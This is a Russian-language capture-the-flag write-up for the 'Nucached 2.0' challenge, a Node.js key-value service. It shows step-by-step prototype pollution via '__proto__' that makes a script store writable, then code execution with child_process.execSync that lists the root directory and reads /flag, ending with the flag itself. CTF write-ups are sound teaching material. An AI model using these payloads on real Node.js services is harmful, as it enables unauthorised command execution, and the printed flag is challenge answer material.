# Nucached 2.0: Write-up

*Сначала рекомендуется прочесть [разбор задания Nucached](../nucached/WRITEUP.md).*

Проделав тот же фокус, что и в предыдущей версии задания, получаем неутешительный результат:

```
> set main.__proto__.readable 1
success

> ls
Store secrets:
  secrets.flag = "this_is_not_the_flag_you_are_looking_for"
  secrets.readable = 1
Store main:
  main.hello = "Hello, world!"
  main.readable = 1
Store scripts (unwritable) (executable):
  scripts.ping = "\"Pong\""
  scripts.uptime = "((Date.now() - startedDate) / 1000) + \"s\""
  scripts.readable = 1
Store readable (unwritable) = undefined
```

Особо настойчивые люди могут специально убедиться, что флаг `this_is_not_the_flag_you_are_looking_for` не работает. Отматываем всё назад.

Итак, по сравнению с предыдущей версией задания, появился дополнительный раздел `scripts`:

```
> ls
Store secrets (unreadable) = ???
Store main:
  main.hello = "Hello, world!"
Store scripts (unwritable) (executable):
  scripts.ping = "\"Pong\""
  scripts.uptime = "((Date.now() - startedDate) / 1000) + \"s\""
```

По-видимому, там хранятся произвольные скрипты, которые затем можно исполнять?..

```
> help
nucached: a revolutionary alternative to memcached!
(c) 2003, Vasya Pupkin
Usage:
  help: Show this message
  get key: Show key key
  set key value: Set the value of key to value
  ls: List all keys
  exec key: Execute script from key key
Nested key-value objects are supported, e.g. set a.b.c value.
```

Да, действительно. Убедимся, что все работает:

```
> exec scripts.uptime
"74.42s"
```

Попробуем добавить свой скрипт:

```
> set scripts.test "1 + 2"
unwritable namespace scripts
```

Действительно. Исходных кодов у нас нет, но из исходного кода первой задачи и из общих размышлений можно догадаться, что нужно установить поле `writable` (а не `readable`) тем же методом:

```
> set main.__proto__.writable 1
success

> set scripts.test "1 + 2"
success

> exec scripts.test
3
```

Итак, у нас, по-видимому, есть RCE. Осталось понять, как в NodeJS выполнять консольные команды. Пять минут гугления спустя видим документацию модуля [child_process](https://nodejs.org/docs/latest/api/child_process.html) и функции `execSync`. Составляем эксплоит:

```
> set scripts.test "require('child_process').execSync('ls -la /')"
success

> exec scripts.test
{"type":"Buffer","data":[116,111,...,114,10]}
```

Такой ответ неудобно читать глазами, поэтому переведём в текст в UTF-8:

```
> set scripts.test "require('child_process').execSync('ls -la /', {encoding: 'utf-8'})"
success

> exec scripts.test
"total 60\ndrwxr-xr-x    1 root     root           120 Mar 12 13:00 .\ndrwxr-xr-x    1 root     root           120 Mar 12 13:00 ..\ndrwxr-xr-x    3 root     root          4096 Mar 11 10:43 app\ndrwxr-xr-x    2 root     root          4096 Feb 22 18:25 bin\ndrwxr-xr-x    1 root     root           320 Mar 12 13:00 dev\ndrwxr-xr-x    1 root     root          4096 Feb 22 18:25 etc\n-rw-r--r--    1 nobody   nobody          54 Mar 12 13:00 flag\ndrwxr-xr-x    1 root     root          4096 Feb 22 18:25 home\ndrwxr-xr-x    7 root     root          4096 Feb 22 18:25 lib\ndrwxr-xr-x    5 root     root          4096 Feb 10 16:45 media\ndrwxr-xr-x    2 root     root          4096 Feb 10 16:45 mnt\ndrwxr-xr-x    1 root     root          4096 Feb 22 18:25 opt\ndr-xr-xr-x  259 nobody   nobody           0 Mar 12 13:00 proc\ndrwx------    4 root     root          4096 Feb 22 18:25 root\ndrwxr-xr-x    1 root     root            40 Feb 10 16:45 run\ndrwxr-xr-x    2 root     root          4096 Feb 10 16:45 sbin\ndrwxr-xr-x    2 root     root          4096 Feb 10 16:45 srv\ndrwxr-xr-x    2 root     root          4096 Feb 10 16:45 sys\ndrwxrwxrwt    1 root     root            60 Mar 12 13:01 tmp\ndrwxr-xr-x    7 root     root          4096 Feb 22 18:25 usr\ndrwxr-xr-x   12 root     root          4096 Feb 10 16:45 var\n"
```

Отформатируем:

```
total 60
drwxr-xr-x    1 root     root           120 Mar 12 13:00 .
drwxr-xr-x    1 root     root           120 Mar 12 13:00 ..
drwxr-xr-x    3 root     root          4096 Mar 11 10:43 app
drwxr-xr-x    2 root     root          4096 Feb 22 18:25 bin
drwxr-xr-x    1 root     root           320 Mar 12 13:00 dev
drwxr-xr-x    1 root     root          4096 Feb 22 18:25 etc
-rw-r--r--    1 nobody   nobody          54 Mar 12 13:00 flag
drwxr-xr-x    1 root     root          4096 Feb 22 18:25 home
drwxr-xr-x    7 root     root          4096 Feb 22 18:25 lib
drwxr-xr-x    5 root     root          4096 Feb 10 16:45 media
drwxr-xr-x    2 root     root          4096 Feb 10 16:45 mnt
drwxr-xr-x    1 root     root          4096 Feb 22 18:25 opt
dr-xr-xr-x  259 nobody   nobody           0 Mar 12 13:00 proc
drwx------    4 root     root          4096 Feb 22 18:25 root
drwxr-xr-x    1 root     root            40 Feb 10 16:45 run
drwxr-xr-x    2 root     root          4096 Feb 10 16:45 sbin
drwxr-xr-x    2 root     root          4096 Feb 10 16:45 srv
drwxr-xr-x    2 root     root          4096 Feb 10 16:45 sys
drwxrwxrwt    1 root     root            60 Mar 12 13:01 tmp
drwxr-xr-x    7 root     root          4096 Feb 22 18:25 usr
drwxr-xr-x   12 root     root          4096 Feb 10 16:45 var
```

Читаем `/flag`:

```
> set scripts.test "require('child_process').execSync('cat /flag', {encoding: 'utf-8'})"
success

> exec scripts.test
"ugra_you_should_have_rewritten_it_in_rust_uvk66bmc8mkq"
```

Флаг: **ugra_you_should_have_rewritten_it_in_rust_uvk66bmc8mkq**
